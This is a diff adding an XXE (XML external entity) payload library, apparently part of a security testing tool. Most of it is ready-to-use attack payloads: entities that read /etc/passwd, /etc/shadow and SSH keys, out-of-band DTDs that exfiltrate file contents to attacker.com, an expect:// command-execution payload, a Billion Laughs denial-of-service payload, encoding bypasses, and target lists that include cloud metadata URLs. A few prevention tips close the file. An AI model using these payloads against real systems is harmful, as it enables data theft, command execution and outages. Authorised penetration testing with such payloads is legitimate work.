@@ -1,0 +1,237 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- REVUEX XXE Payload Library v2.0 -->
+
+<!-- ============================================
+     CLASSIC XXE (FILE DISCLOSURE)
+     ============================================ -->
+
+<!-- Basic File Read -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
+
+<!-- Alternative File Read -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<root>&xxe;</root>
+
+<!-- PHP Wrapper (LFI) -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root>&xxe;</root>
+
+<!-- ============================================
+     BLIND XXE (OUT-OF-BAND)
+     ============================================ -->
+
+<!-- Basic OOB -->
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+%xxe;
+]>
+<root></root>
+
+<!-- External DTD for Data Exfiltration -->
+<!-- Save as xxe.dtd on attacker.com:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;
+-->
+
+<!-- Parameter Entity -->
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<root></root>
+
+<!-- ============================================
+     XXE VIA SVG UPLOAD
+     ============================================ -->
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
+    <text>&xxe;</text>
+</svg>
+
+<!-- ============================================
+     XXE VIA SOAP API
+     ============================================ -->
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+        <data>&xxe;</data>
+    </soap:Body>
+</soap:Envelope>
+
+<!-- ============================================
+     XXE VIA OFFICE DOCUMENTS
+     ============================================ -->
+
+<!-- DOCX: word/document.xml -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<w:document>
+    <w:body>
+        <w:p>
+            <w:r>
+                <w:t>&xxe;</w:t>
+            </w:r>
+        </w:p>
+    </w:body>
+</w:document>
+
+<!-- XLSX: xl/sharedStrings.xml -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<sst>
+    <si>
+        <t>&xxe;</t>
+    </si>
+</sst>
+
+<!-- ============================================
+     BILLION LAUGHS (DOS)
+     ============================================ -->
+
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<root>&lol5;</root>
+
+<!-- ============================================
+     TARGET FILES (COMMON)
+     ============================================ -->
+
+<!-- Linux -->
+<!-- file:///etc/passwd -->
+<!-- file:///etc/shadow -->
+<!-- file:///etc/hostname -->
+<!-- file:///etc/hosts -->
+<!-- file:///proc/self/environ -->
+<!-- file:///home/user/.ssh/id_rsa -->
+
+<!-- Windows -->
+<!-- file:///c:/windows/win.ini -->
+<!-- file:///c:/windows/system32/drivers/etc/hosts -->
+<!-- file:///c:/boot.ini -->
+
+<!-- Application Files -->
+<!-- file:///var/www/html/config.php -->
+<!-- file:///etc/nginx/nginx.conf -->
+<!-- file:///etc/apache2/apache2.conf -->
+<!-- file:///var/log/apache2/access.log -->
+
+<!-- Cloud Metadata -->
+<!-- http://169.254.169.254/latest/meta-data/ -->
+<!-- http://metadata.google.internal/computeMetadata/v1/ -->
+
+<!-- ============================================
+     PROTOCOL HANDLERS
+     ============================================ -->
+
+<!-- File Protocol -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+<!-- HTTP Protocol -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://attacker.com/payload">
+]>
+
+<!-- FTP Protocol -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "ftp://attacker.com/payload">
+]>
+
+<!-- PHP Wrapper -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+
+<!-- Expect (Command Execution) -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "expect://whoami">
+]>
+
+<!-- Data Protocol -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">
+]>
+
+<!-- ============================================
+     BYPASS TECHNIQUES
+     ============================================ -->
+
+<!-- UTF-16 Encoding -->
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+<!-- XML Encoding -->
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file://&#x2F;etc&#x2F;passwd">
+]>
+
+<!-- Nested Entities -->
+<!DOCTYPE root [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "data:text/xml,%start;%file;%end;">
+%dtd;
+]>
+
+<!-- ============================================
+     JSON API XXE
+     ============================================ -->
+
+{
+    "data": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+}
+
+<!-- ============================================
+     DETECTION NOTES
+     ============================================ -->
+
+<!-- Common Error Messages:
+- "An error occurred while parsing EntityName"
+- "XML parser error"
+- "External entity not allowed"
+- "The parser has reached the maximum number of entity expansions"
+-->
+
+<!-- Safe Files for Testing:
+- /etc/hostname (Usually safe, non-sensitive)
+- /etc/issue (OS version info)
+- /proc/version (Kernel info)
+-->
+
+<!-- Prevention:
+- Disable external entities (DTD)
+- Use JSON instead of XML when possible
+- Whitelist allowed protocols
+- Use XML parser in safe mode
+-->
